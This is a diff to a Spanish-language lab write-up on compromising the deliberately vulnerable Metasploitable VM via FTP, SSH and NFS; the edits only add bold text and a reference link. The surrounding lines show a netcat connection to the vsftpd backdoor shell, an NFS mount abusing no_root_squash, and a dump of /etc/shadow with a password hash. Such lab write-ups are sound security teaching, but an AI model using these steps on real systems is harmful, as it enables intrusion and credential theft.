@@ -84,7 +84,7 @@ nc IP 6200
 ```
 ![6](https://github.com/vonoHC/Writeups/blob/main/Metasploitable/Capturas/6.png)
 
-Y de esta forma habremos hecho nuestro el sistema de Metasploitable a través de FTP.
+Y de esta forma habremos hecho nuestro el sistema de Metasploitable a través de **FTP**.
 
 ---
 # SSH
@@ -182,7 +182,7 @@ Dentro de Python importamos la biblioteca `os`, y por último llamamos una termi
 
 ![9](https://github.com/vonoHC/Writeups/blob/main/Metasploitable/Capturas/9.png)
 
-Y de esta forma habremos hecho nuestro el sistema de Metasploitable a través de SSH.
+Y de esta forma habremos hecho nuestro el sistema de Metasploitable a través de **SSH**.
 
 # NFS
 ```bash
@@ -199,11 +199,12 @@ mkdir PUNTO_MONTAJE
 sudo mount -t IP:RUTA UBICACION_LOCAL
 ```
 ![11](https://github.com/vonoHC/Writeups/blob/main/Metasploitable/Capturas/11.png)
-Una vez dentro del sistema, podemos comprobar si las configuraciones en el NFS objetivo tienen la opción `no_root_squash` habilitada, cosa que nos permitiría actuar como root dentro del recurso compartido, por el simple hecho de ser root en nuestra máquina local. 
+Una vez dentro del sistema, podemos comprobar si las configuraciones en el NFS objetivo tienen la opción [no_root_squash](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/4/html/security_guide/s2-server-nfs-noroot) habilitada, cosa que nos permitiría actuar como root dentro del recurso compartido, por el simple hecho de ser root en nuestra máquina local. 
 
 Esto lo comprobamos intentando leer el archivo [/etc/shadow](https://linuxize.com/post/etc-shadow-file/) del sistema de Metasploitable:
 ```bash
 sudo cat PUNTO_MONTAJE/etc/shadow
+
 root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:14747:0:99999:7:::
 daemon:*:14684:0:99999:7:::
 bin:*:14684:0:99999:7:::
@@ -256,7 +257,7 @@ Aquí podemos el ejemplo:
 
 ![13](https://github.com/vonoHC/Writeups/blob/main/Metasploitable/Capturas/13.png)
 
-Y de esta forma habremos hecho nuestro el sistema de Metasploitable a través de NFS.
+Y de esta forma habremos hecho nuestro el sistema de Metasploitable a través de **NFS**.
 
 
 
